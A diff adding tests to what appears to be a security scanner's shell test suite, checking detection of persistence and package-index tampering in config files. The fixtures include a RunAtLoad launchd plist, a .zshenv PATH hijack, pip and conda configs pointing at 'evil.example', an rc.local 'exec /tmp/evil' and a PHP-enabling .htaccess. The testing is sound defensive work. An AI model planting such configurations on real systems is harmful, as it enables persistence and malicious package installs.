@@ -8266,6 +8266,36 @@ printf 'exec /tmp/evil\n' > "$XDIR/rc.local"
 ./hlse_core file "$XDIR/rc.local" 2>&1 | grep -q "F56" \
     && check "file: non-carrier name no F56" "0" "1" \
     || check "file: non-carrier name no F56" "0" "0"
+# F56 continued: launchd plist / shell rc / package-mgr index override
+printf '<?xml version="1.0"?><plist><dict><key>RunAtLoad</key><true/>'\
+'<key>ProgramArguments</key><array><string>/tmp/x</string></array>'\
+'</dict></plist>\n' > "$XDIR/evil.plist"
+./hlse_core file "$XDIR/evil.plist" 2>&1 | grep -q "F56: SYSTEM CONFIG" \
+    && check "file: runatload plist flagged" "0" "0" \
+    || check "file: runatload plist flagged" "0" "1"
+printf 'export PATH=/tmp:$PATH\n' > "$XDIR/.zshenv"
+./hlse_core file "$XDIR/.zshenv" 2>&1 | grep -q "F56: SYSTEM CONFIG" \
+    && check "file: zshenv flagged" "0" "0" \
+    || check "file: zshenv flagged" "0" "1"
+printf '[global]\nextra-index-url = http://evil.example/pypi\n' \
+    > "$XDIR/pip.conf"
+./hlse_core file "$XDIR/pip.conf" 2>&1 | grep -q "F56: SYSTEM CONFIG" \
+    && check "file: pip extra-index flagged" "0" "0" \
+    || check "file: pip extra-index flagged" "0" "1"
+printf 'channels:\n - http://evil.example/conda\n' > "$XDIR/.condarc"
+./hlse_core file "$XDIR/.condarc" 2>&1 | grep -q "F56: SYSTEM CONFIG" \
+    && check "file: condarc channels flagged" "0" "0" \
+    || check "file: condarc channels flagged" "0" "1"
+printf '<?xml version="1.0"?><plist><dict><key>CFBundleName</key>'\
+'<string>App</string></dict></plist>\n' > "$XDIR/app.plist"
+./hlse_core file "$XDIR/app.plist" 2>&1 | grep -q "F56" \
+    && check "file: benign info plist no F56" "0" "1" \
+    || check "file: benign info plist no F56" "0" "0"
+printf '[global]\ntimeout = 30\n' > "$XDIR/pip2.conf"
+mv "$XDIR/pip2.conf" "$XDIR/plain_pip.conf" 2>/dev/null
+./hlse_core file "$XDIR/plain_pip.conf" 2>&1 | grep -q "F56" \
+    && check "file: no-index pip conf no F56" "0" "1" \
+    || check "file: no-index pip conf no F56" "0" "0"
 # F52–F55: server-config carriers
 printf 'AddType application/x-httpd-php .jpg\nphp_flag engine on\n' \
     > "$XDIR/.htaccess"
